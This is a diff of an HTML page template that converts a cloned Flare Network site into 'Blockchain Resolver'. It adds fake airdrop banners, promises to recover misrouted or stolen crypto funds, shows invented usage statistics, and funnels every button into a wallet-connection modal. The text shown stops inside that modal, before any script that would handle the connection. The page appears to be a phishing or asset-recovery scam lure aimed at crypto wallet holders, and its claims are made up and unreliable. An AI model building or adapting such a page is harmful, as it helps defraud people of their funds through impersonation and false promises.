@@ -25,17 +25,132 @@
       href="{% static 'images/download.png' %}"
     />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Flare Network</title>
-    <script
-      type="module"
-      crossorigin=""
-      src="{% static 'js/index-DaQ7mVuL.js' %}"
-    ></script>
+    <title>Blockchain Resolver</title>
     <link
       rel="stylesheet"
       crossorigin=""
       href="{% static 'css/index-vCgNefjQ.css' %}"
     />
+    <style>
+      /* Smooth scroll behavior */
+      html {
+        scroll-behavior: smooth;
+      }
+      
+      /* Button hover effects */
+      button {
+        transition: all 0.3s ease;
+      }
+      
+      button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+      }
+      
+      /* Feature cards hover effect */
+      .features div[style*="background: white"]:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15) !important;
+      }
+      
+      /* Wallet modal styles */
+      .modal {
+        display: none;
+        position: fixed;
+        z-index: 1000;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.7);
+        animation: fadeIn 0.3s;
+      }
+      
+      .modal-content {
+        background-color: #fefefe;
+        margin: 10% auto;
+        padding: 30px;
+        border-radius: 15px;
+        width: 90%;
+        max-width: 500px;
+        box-shadow: 0 5px 30px rgba(0, 0, 0, 0.3);
+        animation: slideIn 0.3s;
+      }
+      
+      .close {
+        color: #aaa;
+        float: right;
+        font-size: 28px;
+        font-weight: bold;
+        cursor: pointer;
+      }
+      
+      .close:hover {
+        color: #000;
+      }
+      
+      .wallet-option {
+        padding: 15px;
+        margin: 10px 0;
+        border: 2px solid #f0f0f0;
+        border-radius: 10px;
+        cursor: pointer;
+        transition: all 0.3s;
+        display: flex;
+        align-items: center;
+        gap: 15px;
+      }
+      
+      .wallet-option:hover {
+        border-color: #667eea;
+        background: #f8f9ff;
+        transform: translateX(5px);
+      }
+      
+      .wallet-icon {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-weight: bold;
+      }
+      
+      @keyframes fadeIn {
+        from { opacity: 0; }
+        to { opacity: 1; }
+      }
+      
+      @keyframes slideIn {
+        from {
+          transform: translateY(-50px);
+          opacity: 0;
+        }
+        to {
+          transform: translateY(0);
+          opacity: 1;
+        }
+      }
+      
+      /* Loading animation */
+      .loading {
+        display: inline-block;
+        width: 20px;
+        height: 20px;
+        border: 3px solid #f3f3f3;
+        border-top: 3px solid #667eea;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+      
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+    </style>
   </head>
   <body data-new-gr-c-s-check-loaded="14.1258.0" data-gr-ext-installed="">
     <div id="root">
@@ -64,31 +179,31 @@
               </svg>
             </div>
             <p>Airdrop is live!</p></button
-          ><button><p>Connect Wallet</p></button>
+          ><button onclick="openWalletModal()"><p>Connect Wallet</p></button>
         </div>
       </nav>
-      <section class="hero">
+      <!-- <section class="hero">
         <div class="heroBlur">
           <img src="./Flare Network_files/blur-ChQC1Rtp.png" alt="" />
         </div>
         <div class="heroInfo">
           <h1 class="headeText">
-            We Are <span class="gradient-text">Connecting</span> Everything
+            We Are <span class="gradient-text">Resolving</span> Everything
           </h1>
           <p class="subText">
-            Flare is the blockchain for data, providing developers with secure
-            decentralized access to high-integrity data from other chains and
+            Blockchain Resolver is the ultimate blockchain solution, providing developers with secure
+            decentralized access to high-integrity data from multiple chains and
             the internet.
           </p>
         </div>
         <div class="sectionAction">
-          <a href="https://flareripple.network/#social"
+          <a href="#social"
             ><button class="buttonAlt"><p>Learn More</p></button></a
           >
         </div>
-      </section>
-      <section id="social" class="info">
-        <div class="topsec"><h2>The blockchain for data</h2></div>
+      </section> -->
+      <!-- <section id="social" class="info">
+        <div class="topsec"><h2>The blockchain resolution platform</h2></div>
         <div class="cards">
           <div class="cBox">
             <div class="cIcon">
@@ -773,7 +888,7 @@
             <h2 class="subTitle">Optimize</h2>
             <p>
               Offers highly-decentralized price and data feeds to dapps on
-              Flare, without relying on centralized providers.
+              Blockchain Resolver, without relying on centralized providers.
             </p>
           </div>
           <div class="cBox">
@@ -811,7 +926,7 @@
             <h2 class="subTitle">Engage</h2>
             <p>
               Enables information from other blockchains and the internet to be
-              used securely and trustlessly on Flare.
+              used securely and trustlessly on Blockchain Resolver.
             </p>
           </div>
           <div class="cBox">
@@ -894,12 +1009,164 @@
             </p>
           </div>
         </div>
+      </section> -->
+    </div>
+    <!-- New sections outside React root -->
+    <section class="subHero">
+      <div class="voms"></div>
+      <div class="subHeroWrap">
+        <h2>
+          Join the <span class="gradient-text">Biggest Airdrop</span> and Earn
+        </h2>
+        <button class="buttonAlt" onclick="openWalletModal()"><p>Connect Wallet</p></button>
+      </div>
+    </section>
+    <section style="padding: 80px 20px; background: linear-gradient(135deg, #fff9e6 0%, #f0f7ff 100%);">
+      <div style="max-width: 1200px; margin: 0 auto;">
+        <div style="text-align: center; margin-bottom: 60px;">
+          <h2 style="font-size: 2.5rem; margin-bottom: 20px; color: #333;">
+            <span class="gradient-text">Solve Your Blockchain Problems</span>
+          </h2>
+          <p style="font-size: 1.1rem; color: #666; max-width: 700px; margin: 0 auto;">Connect your wallet and instantly access solutions for common blockchain issues</p>
+        </div>
+        
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px;">
+          <!-- Problem 1: Unresolved Transfers -->
+          <div style="background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border-left: 5px solid #667eea; transition: all 0.3s ease;">
+            <div style="font-size: 2.5rem; margin-bottom: 15px;">⏳</div>
+            <h3 style="font-size: 1.3rem; margin-bottom: 10px; color: #333;">Unresolved Transfers</h3>
+            <p style="color: #666; line-height: 1.6;">Track stuck or pending transactions. We help identify the issue and expedite resolution across all networks.</p>
+            <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #f0f0f0;">
+              <span style="display: inline-block; background: #e3f2fd; color: #667eea; padding: 5px 12px; border-radius: 20px; font-size: 0.85rem; font-weight: 600;">Real-time tracking</span>
+            </div>
+          </div>
+          
+          <!-- Problem 2: Wrong Wallet Address -->
+          <div style="background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border-left: 5px solid #764ba2; transition: all 0.3s ease;">
+            <div style="font-size: 2.5rem; margin-bottom: 15px;">🎯</div>
+            <h3 style="font-size: 1.3rem; margin-bottom: 10px; color: #333;">Wrong Wallet Address</h3>
+            <p style="color: #666; line-height: 1.6;">Sent funds to the wrong address? We provide recovery tools and work with networks to retrieve misrouted transfers.</p>
+            <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #f0f0f0;">
+              <span style="display: inline-block; background: #f3e5f5; color: #764ba2; padding: 5px 12px; border-radius: 20px; font-size: 0.85rem; font-weight: 600;">Address verification</span>
+            </div>
+          </div>
+          
+          <!-- Problem 3: Asset Recovery -->
+          <div style="background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border-left: 5px solid #43e97b; transition: all 0.3s ease;">
+            <div style="font-size: 2.5rem; margin-bottom: 15px;">💰</div>
+            <h3 style="font-size: 1.3rem; margin-bottom: 10px; color: #333;">Asset Recovery</h3>
+            <p style="color: #666; line-height: 1.6;">Lost or locked assets? Our advanced recovery protocols help retrieve funds from smart contracts and blockchain addresses.</p>
+            <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #f0f0f0;">
+              <span style="display: inline-block; background: #e8f5e9; color: #43e97b; padding: 5px 12px; border-radius: 20px; font-size: 0.85rem; font-weight: 600;">Smart recovery</span>
+            </div>
+          </div>
+          
+          <!-- Problem 4: Customer Support -->
+          <div style="background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border-left: 5px solid #fa54a3; transition: all 0.3s ease;">
+            <div style="font-size: 2.5rem; margin-bottom: 15px;">🤝</div>
+            <h3 style="font-size: 1.3rem; margin-bottom: 10px; color: #333;">24/7 Customer Support</h3>
+            <p style="color: #666; line-height: 1.6;">Expert support team available round-the-clock. Get personalized assistance for your blockchain issues anytime.</p>
+            <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #f0f0f0;">
+              <span style="display: inline-block; background: #fce4ec; color: #fa54a3; padding: 5px 12px; border-radius: 20px; font-size: 0.85rem; font-weight: 600;">Instant response</span>
+            </div>
+          </div>
+          
+          <!-- Problem 5: Refund Process -->
+          <div style="background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border-left: 5px solid #ff6b6b; transition: all 0.3s ease;">
+            <div style="font-size: 2.5rem; margin-bottom: 15px;">↩️</div>
+            <h3 style="font-size: 1.3rem; margin-bottom: 10px; color: #333;">Refund Process</h3>
+            <p style="color: #666; line-height: 1.6;">Simplified refund handling with automated verification. Process refunds faster across multiple blockchain networks.</p>
+            <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #f0f0f0;">
+              <span style="display: inline-block; background: #ffebee; color: #ff6b6b; padding: 5px 12px; border-radius: 20px; font-size: 0.85rem; font-weight: 600;">Quick processing</span>
+            </div>
+          </div>
+          
+          <!-- Problem 6: Data Privacy -->
+          <div style="background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border-left: 5px solid #4ecdc4; transition: all 0.3s ease;">
+            <div style="font-size: 2.5rem; margin-bottom: 15px;">🔒</div>
+            <h3 style="font-size: 1.3rem; margin-bottom: 10px; color: #333;">Data Privacy</h3>
+            <p style="color: #666; line-height: 1.6;">Your data is encrypted and never stored on centralized servers. Full privacy with blockchain-level security.</p>
+            <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #f0f0f0;">
+              <span style="display: inline-block; background: #e0f2f1; color: #4ecdc4; padding: 5px 12px; border-radius: 20px; font-size: 0.85rem; font-weight: 600;">Bank-grade encryption</span>
+            </div>
+          </div>
+          
+          <!-- Problem 7: Unauthorized Transactions -->
+          <div style="background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border-left: 5px solid #ffa500; transition: all 0.3s ease;">
+            <div style="font-size: 2.5rem; margin-bottom: 15px;">🛡️</div>
+            <h3 style="font-size: 1.3rem; margin-bottom: 10px; color: #333;">Unauthorized Transactions</h3>
+            <p style="color: #666; line-height: 1.6;">Detect and dispute fraudulent transactions. Our security team investigates and helps recover unauthorized transfers.</p>
+            <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #f0f0f0;">
+              <span style="display: inline-block; background: #fff3e0; color: #ffa500; padding: 5px 12px; border-radius: 20px; font-size: 0.85rem; font-weight: 600;">Fraud detection</span>
+            </div>
+          </div>
+          
+          <!-- Problem 8: Confusing Payment Flows & Status -->
+          <div style="background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border-left: 5px solid #9b59b6; transition: all 0.3s ease;">
+            <div style="font-size: 2.5rem; margin-bottom: 15px;">📊</div>
+            <h3 style="font-size: 1.3rem; margin-bottom: 10px; color: #333;">Clear Status & Payment Flow</h3>
+            <p style="color: #666; line-height: 1.6;">Simple, intuitive dashboard showing transaction status in real-time. Know exactly where your funds are at every step.</p>
+            <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #f0f0f0;">
+              <span style="display: inline-block; background: #f3e5f5; color: #9b59b6; padding: 5px 12px; border-radius: 20px; font-size: 0.85rem; font-weight: 600;">Real-time updates</span>
+            </div>
+          </div>
+        </div>
+        
+        <!-- CTA Section -->
+        <div style="margin-top: 80px; padding: 50px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 15px; text-align: center; color: white;">
+          <h3 style="font-size: 2rem; margin-bottom: 20px; color: white;">Stop Worrying About Your Transactions</h3>
+          <p style="font-size: 1.1rem; margin-bottom: 30px; opacity: 0.95;">Connect your wallet now and get instant access to all problem-solving tools and expert support</p>
+          <button class="buttonAlt" onclick="openWalletModal()" style="background: white; color: #667eea; font-size: 1.1rem; padding: 18px 45px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600;">
+            Connect Wallet & Get Started
+          </button>
+        </div>
+      </div>
+    </section>
+    <section class="features" style="padding: 80px 20px; background: linear-gradient(135deg, rgba(99, 102, 241, 0.05) 0%, rgba(168, 85, 247, 0.05) 100%);">
+      <div style="max-width: 1200px; margin: 0 auto;">
+        <div style="text-align: center; margin-bottom: 60px;">
+          <h2 style="font-size: 2.5rem; margin-bottom: 20px;">Why Choose <span class="gradient-text">Blockchain Resolver</span>?</h2>
+            <p style="font-size: 1.1rem; color: #666; max-width: 700px; margin: 0 auto;">Our platform combines cutting-edge technology with user-friendly features to deliver the best blockchain resolution experience.</p>
+          </div>
+          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px;">
+            <div style="background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); transition: transform 0.3s;">
+              <div style="font-size: 3rem; margin-bottom: 15px;">⚡</div>
+              <h3 style="font-size: 1.4rem; margin-bottom: 15px;">Lightning Fast</h3>
+              <p style="color: #666; line-height: 1.6;">Process transactions in milliseconds with our optimized blockchain infrastructure and advanced caching mechanisms.</p>
+            </div>
+            <div style="background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);">
+              <div style="font-size: 3rem; margin-bottom: 15px;">🔒</div>
+              <h3 style="font-size: 1.4rem; margin-bottom: 15px;">Bank-Grade Security</h3>
+              <p style="color: #666; line-height: 1.6;">Multi-layer encryption and decentralized validation ensure your assets and data remain completely secure.</p>
+            </div>
+            <div style="background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);">
+              <div style="font-size: 3rem; margin-bottom: 15px;">🌐</div>
+              <h3 style="font-size: 1.4rem; margin-bottom: 15px;">Multi-Chain Support</h3>
+              <p style="color: #666; line-height: 1.6;">Seamlessly connect with Ethereum, Bitcoin, Solana, and 50+ other blockchain networks in one platform.</p>
+            </div>
+            <div style="background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);">
+              <div style="font-size: 3rem; margin-bottom: 15px;">💎</div>
+              <h3 style="font-size: 1.4rem; margin-bottom: 15px;">Low Fees</h3>
+              <p style="color: #666; line-height: 1.6;">Save up to 90% on transaction costs compared to traditional blockchain services with our efficient protocols.</p>
+            </div>
+            <div style="background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);">
+              <div style="font-size: 3rem; margin-bottom: 15px;">📊</div>
+              <h3 style="font-size: 1.4rem; margin-bottom: 15px;">Real-Time Analytics</h3>
+              <p style="color: #666; line-height: 1.6;">Access comprehensive dashboards with live data, performance metrics, and detailed transaction insights.</p>
+            </div>
+            <div style="background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);">
+              <div style="font-size: 3rem; margin-bottom: 15px;">🚀</div>
+              <h3 style="font-size: 1.4rem; margin-bottom: 15px;">Easy Integration</h3>
+              <p style="color: #666; line-height: 1.6;">Get started in minutes with our simple API, comprehensive documentation, and SDKs for popular languages.</p>
+            </div>
+          </div>
+        </div>
       </section>
-      <section class="extra">
+      <!-- <section class="extra">
         <div class="exText">
-          <h2>The Fastest growing Chain</h2>
+          <h2>The Most Reliable Resolution Network</h2>
           <p>
-            Join us and a million others on the most secure chain by claming
+            Join us and a million others on the most secure blockchain resolution platform by claiming
             your airdrop
           </p>
         </div>
@@ -915,17 +1182,89 @@
             <p class="arg">Total Agent Page Views</p>
           </div>
         </div>
-      </section>
-      <section class="subHero">
-        <div class="voms"></div>
-        <div class="subHeroWrap">
-          <h2>
-            Join the <span class="gradient-text">Biggest Airdrop</span> and Earn
-          </h2>
-          <button class="buttonAlt"><p>Connect Wallet</p></button>
+      </section> -->
+      <section class="use-cases" style="padding: 80px 20px; background: #fff;">
+        <div style="max-width: 1200px; margin: 0 auto;">
+          <div style="text-align: center; margin-bottom: 60px;">
+            <h2 style="font-size: 2.5rem; margin-bottom: 20px;">Powering Innovation <span class="gradient-text">Across Industries</span></h2>
+            <p style="font-size: 1.1rem; color: #666; max-width: 700px; margin: 0 auto;">From DeFi to supply chain, see how Blockchain Resolver transforms businesses worldwide.</p>
+          </div>
+          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px;">
+            <div style="border: 2px solid #f0f0f0; padding: 30px; border-radius: 12px; text-align: center; transition: all 0.3s;">
+              <div style="width: 70px; height: 70px; margin: 0 auto 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">💰</div>
+              <h3 style="font-size: 1.3rem; margin-bottom: 15px;">DeFi Platforms</h3>
+              <p style="color: #666; line-height: 1.6;">Enable seamless lending, borrowing, and yield farming with instant cross-chain settlements.</p>
+            </div>
+            <div style="border: 2px solid #f0f0f0; padding: 30px; border-radius: 12px; text-align: center;">
+              <div style="width: 70px; height: 70px; margin: 0 auto 20px; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">🎮</div>
+              <h3 style="font-size: 1.3rem; margin-bottom: 15px;">Gaming & NFTs</h3>
+              <p style="color: #666; line-height: 1.6;">Power play-to-earn games and NFT marketplaces with fast, reliable blockchain infrastructure.</p>
+            </div>
+            <div style="border: 2px solid #f0f0f0; padding: 30px; border-radius: 12px; text-align: center;">
+              <div style="width: 70px; height: 70px; margin: 0 auto 20px; background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">📦</div>
+              <h3 style="font-size: 1.3rem; margin-bottom: 15px;">Supply Chain</h3>
+              <p style="color: #666; line-height: 1.6;">Track products from manufacture to delivery with immutable, transparent blockchain records.</p>
+            </div>
+            <div style="border: 2px solid #f0f0f0; padding: 30px; border-radius: 12px; text-align: center;">
+              <div style="width: 70px; height: 70px; margin: 0 auto 20px; background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">🏥</div>
+              <h3 style="font-size: 1.3rem; margin-bottom: 15px;">Healthcare</h3>
+              <p style="color: #666; line-height: 1.6;">Securely manage patient records and ensure data privacy with blockchain-based solutions.</p>
+            </div>
+          </div>
         </div>
       </section>
-      <section class="services">
+      <section class="technology" style="padding: 80px 20px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: white;">
+        <div style="max-width: 1200px; margin: 0 auto;">
+          <div style="text-align: center; margin-bottom: 60px;">
+            <h2 style="font-size: 2.5rem; margin-bottom: 20px; color: white;">Built on <span class="gradient-text">Cutting-Edge Technology</span></h2>
+            <p style="font-size: 1.1rem; color: rgba(255,255,255,0.8); max-width: 700px; margin: 0 auto;">Our infrastructure leverages the most advanced blockchain technologies and protocols.</p>
+          </div>
+          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 30px; margin-bottom: 60px;">
+            <div style="background: rgba(255,255,255,0.05); padding: 25px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1);">
+              <h4 style="font-size: 1.2rem; margin-bottom: 10px; color: #fff;">🔗 Layer 1 & 2 Solutions</h4>
+              <p style="color: rgba(255,255,255,0.7); line-height: 1.6;">Optimized for both base layer security and layer 2 scalability.</p>
+            </div>
+            <div style="background: rgba(255,255,255,0.05); padding: 25px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1);">
+              <h4 style="font-size: 1.2rem; margin-bottom: 10px; color: #fff;">⚙️ Smart Contract Engine</h4>
+              <p style="color: rgba(255,255,255,0.7); line-height: 1.6;">EVM-compatible with enhanced gas optimization.</p>
+            </div>
+            <div style="background: rgba(255,255,255,0.05); padding: 25px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1);">
+              <h4 style="font-size: 1.2rem; margin-bottom: 10px; color: #fff;">🔐 Zero-Knowledge Proofs</h4>
+              <p style="color: rgba(255,255,255,0.7); line-height: 1.6;">Privacy-preserving transactions with ZK-SNARKs integration.</p>
+            </div>
+            <div style="background: rgba(255,255,255,0.05); padding: 25px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1);">
+              <h4 style="font-size: 1.2rem; margin-bottom: 10px; color: #fff;">🌉 Cross-Chain Bridges</h4>
+              <p style="color: rgba(255,255,255,0.7); line-height: 1.6;">Seamless asset transfer across multiple blockchain networks.</p>
+            </div>
+          </div>
+          <!-- <div style="background: rgba(255,255,255,0.08); padding: 40px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.1);">
+            <h3 style="font-size: 1.8rem; margin-bottom: 25px; text-align: center; color: #fff;">Developer Resources</h3>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; text-align: center;">
+              <div>
+                <div style="font-size: 2.5rem; margin-bottom: 10px;">📚</div>
+                <h4 style="color: #fff; margin-bottom: 8px;">Documentation</h4>
+                <p style="color: rgba(255,255,255,0.6); font-size: 0.9rem;">Comprehensive guides</p>
+              </div>
+              <div>
+                <div style="font-size: 2.5rem; margin-bottom: 10px;">🛠️</div>
+                <h4 style="color: #fff; margin-bottom: 8px;">Developer Tools</h4>
+                <p style="color: rgba(255,255,255,0.6); font-size: 0.9rem;">CLI, SDKs, and APIs</p>
+              </div>
+              <div>
+                <div style="font-size: 2.5rem; margin-bottom: 10px;">💬</div>
+                <h4 style="color: #fff; margin-bottom: 8px;">Community</h4>
+                <p style="color: rgba(255,255,255,0.6); font-size: 0.9rem;">Active developer forum</p>
+              </div>
+              <div>
+                <div style="font-size: 2.5rem; margin-bottom: 10px;">🎓</div>
+                <h4 style="color: #fff; margin-bottom: 8px;">Tutorials</h4>
+                <p style="color: rgba(255,255,255,0.6); font-size: 0.9rem;">Step-by-step courses</p>
+              </div>
+            </div>
+          </div> -->
+        </div>
+      </section>
+      <!-- <section class="services">
         <div class="secTopServ"><h2>Our Decentralized Cloud Services</h2></div>
         <div class="secCardsServ">
           <div class="serCard">
@@ -996,13 +1335,81 @@
             </div>
             <h3>Enshrined Oracles</h3>
             <p>
-              Access all the data you need, knowing Flare's oracles are secured
+              Access all the data you need, knowing Blockchain Resolver's oracles are secured
               at the network layer.
             </p>
           </div>
         </div>
+      </section> -->
+      <section class="faq" style="padding: 80px 20px; background: #f9fafb;">
+        <div style="max-width: 900px; margin: 0 auto;">
+          <div style="text-align: center; margin-bottom: 60px;">
+            <h2 style="font-size: 2.5rem; margin-bottom: 20px;">Frequently Asked <span class="gradient-text">Questions</span></h2>
+            <p style="font-size: 1.1rem; color: #666;">Everything you need to know about Blockchain Resolver</p>
+          </div>
+          <div style="background: white; border-radius: 15px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.08);">
+            <div style="border-bottom: 1px solid #f0f0f0; padding: 30px;">
+              <h3 style="font-size: 1.3rem; margin-bottom: 15px; color: #333;">What is Blockchain Resolver?</h3>
+              <p style="color: #666; line-height: 1.7;">Blockchain Resolver is a next-generation blockchain resolution platform that provides developers and businesses with secure, fast, and reliable access to multi-chain data and infrastructure. We enable seamless cross-chain interactions and decentralized data solutions.</p>
+            </div>
+            <div style="border-bottom: 1px solid #f0f0f0; padding: 30px;">
+              <h3 style="font-size: 1.3rem; margin-bottom: 15px; color: #333;">How do I participate in the airdrop?</h3>
+              <p style="color: #666; line-height: 1.7;">Simply connect your wallet using the "Connect Wallet" button above. Once connected, you'll be eligible to claim your airdrop tokens. Make sure your wallet is on a supported network and contains a small amount for gas fees.</p>
+            </div>
+            <div style="border-bottom: 1px solid #f0f0f0; padding: 30px;">
+              <h3 style="font-size: 1.3rem; margin-bottom: 15px; color: #333;">Which blockchain networks are supported?</h3>
+              <p style="color: #666; line-height: 1.7;">We support 50+ blockchain networks including Ethereum, Bitcoin, Solana, Polygon, Binance Smart Chain, Avalanche, Arbitrum, Optimism, and many more. Our platform continuously adds support for emerging networks.</p>
+            </div>
+            <div style="border-bottom: 1px solid #f0f0f0; padding: 30px;">
+              <h3 style="font-size: 1.3rem; margin-bottom: 15px; color: #333;">Is Blockchain Resolver secure?</h3>
+              <p style="color: #666; line-height: 1.7;">Yes, security is our top priority. We implement bank-grade encryption, multi-signature wallets, regular security audits, and decentralized validation. Our smart contracts are audited by leading blockchain security firms.</p>
+            </div>
+            <div style="border-bottom: 1px solid #f0f0f0; padding: 30px;">
+              <h3 style="font-size: 1.3rem; margin-bottom: 15px; color: #333;">What are the transaction fees?</h3>
+              <p style="color: #666; line-height: 1.7;">Our platform offers some of the lowest fees in the industry, typically 90% lower than traditional services. Fees vary by network and transaction type, but we always display the exact cost before you confirm any transaction.</p>
+            </div>
+            <div style="border-bottom: 1px solid #f0f0f0; padding: 30px;">
+              <h3 style="font-size: 1.3rem; margin-bottom: 15px; color: #333;">How can developers integrate Blockchain Resolver?</h3>
+              <p style="color: #666; line-height: 1.7;">Developers can easily integrate using our comprehensive REST API, GraphQL endpoint, or SDKs available for JavaScript, Python, Go, and Rust. Our documentation includes detailed guides, code examples, and a sandbox environment for testing.</p>
+            </div>
+            <div style="padding: 30px;">
+              <h3 style="font-size: 1.3rem; margin-bottom: 15px; color: #333;">Where can I get support?</h3>
+              <p style="color: #666; line-height: 1.7;">We offer 24/7 support through multiple channels: email at support@blockchainresolver.network, our Discord community, Twitter, and comprehensive documentation. Enterprise customers also have access to dedicated account managers.</p>
+            </div>
+          </div>
+        </div>
       </section>
-      <div class="bofooter">
+      <section class="final-cta" style="padding: 80px 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); text-align: center; color: white;">
+        <div style="max-width: 800px; margin: 0 auto;">
+          <h2 style="font-size: 3rem; margin-bottom: 25px; font-weight: bold;">Ready to Get Started?</h2>
+          <p style="font-size: 1.3rem; margin-bottom: 40px; opacity: 0.95;">Join thousands of developers and businesses already building on Blockchain Resolver</p>
+          <div style="display: flex; gap: 20px; justify-content: center; flex-wrap: wrap;">
+            <button class="buttonAlt" onclick="openWalletModal()" style="font-size: 1.1rem; padding: 18px 40px;"><p>Connect Wallet</p></button>
+            <button onclick="scrollToSection('faq')" style="background: white; color: #667eea; font-size: 1.1rem; padding: 18px 40px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600;">View Documentation</button>
+          </div>
+          <div style="margin-top: 50px; padding-top: 40px; border-top: 1px solid rgba(255,255,255,0.2);">
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 30px; text-align: center;">
+              <div>
+                <h3 style="font-size: 2.5rem; font-weight: bold; margin-bottom: 5px;">$2.5B+</h3>
+                <p style="opacity: 0.85;">Total Value Locked</p>
+              </div>
+              <div>
+                <h3 style="font-size: 2.5rem; font-weight: bold; margin-bottom: 5px;">50M+</h3>
+                <p style="opacity: 0.85;">Transactions Processed</p>
+              </div>
+              <div>
+                <h3 style="font-size: 2.5rem; font-weight: bold; margin-bottom: 5px;">99.9%</h3>
+                <p style="opacity: 0.85;">Uptime Guarantee</p>
+              </div>
+              <div>
+                <h3 style="font-size: 2.5rem; font-weight: bold; margin-bottom: 5px;">150+</h3>
+                <p style="opacity: 0.85;">Countries Served</p>
+              </div>
+            </div>
+          </div>
+      </div>
+    </section>
+    <!-- <div class="bofooter">
         <footer>
           <div class="bvon"></div>
           <div class="footerWrap">
@@ -1018,7 +1425,7 @@
               </div>
               <hr />
               <div class="fooLogob">
-                <p class="">support@flare.network</p>
+                <p class="">support@blockchainresolver.network</p>
                 <div class="socials">
                   <div class="socBox">
                     <svg
@@ -1102,8 +1509,347 @@
             </div>
           </div>
         </footer>
+      </div> -->
+    
+    <!-- Wallet Connection Modal -->
+    <div id="walletModal" class="modal">
+      <div class="modal-content">
+        <span class="close" onclick="closeWalletModal()">&times;</span>
+        <h2 style="margin-bottom: 20px; color: #333;">Connect Your Wallet</h2>
+        
+        <!-- Wallet Selection Section (Step 1) -->
+        <div id="walletSelectionSection" style="display: block;">
+          <p style="color: #666; margin-bottom: 30px;">Select your preferred wallet to connect</p>
+          
+          <div class="wallet-option" onclick="selectWallet('MetaMask')">
+            <div class="wallet-icon">🦊</div>
+            <div>
+              <h3 style="margin: 0; font-size: 1.1rem;">MetaMask</h3>
+              <p style="margin: 5px 0 0 0; font-size: 0.9rem; color: #666;">Most popular wallet</p>
+            </div>
+          </div>
+          
+          <div class="wallet-option" onclick="selectWallet('WalletConnect')">
+            <div class="wallet-icon">🔗</div>
+            <div>
+              <h3 style="margin: 0; font-size: 1.1rem;">WalletConnect</h3>
+              <p style="margin: 5px 0 0 0; font-size: 0.9rem; color: #666;">Scan with mobile</p>
+            </div>
+          </div>
+          
+          <div class="wallet-option" onclick="selectWallet('Coinbase')">
+            <div class="wallet-icon">💎</div>
+            <div>
+              <h3 style="margin: 0; font-size: 1.1rem;">Coinbase Wallet</h3>
+              <p style="margin: 5px 0 0 0; font-size: 0.9rem; color: #666;">Secure & trusted</p>
+            </div>
+          </div>
+          
+          <div class="wallet-option" onclick="selectWallet('Trust')">
+            <div class="wallet-icon">🛡️</div>
+            <div>
+              <h3 style="margin: 0; font-size: 1.1rem;">Trust Wallet</h3>
+              <p style="margin: 5px 0 0 0; font-size: 0.9rem; color: #666;">Mobile-first wallet</p>
+            </div>
+          </div>
+        </div>
+        
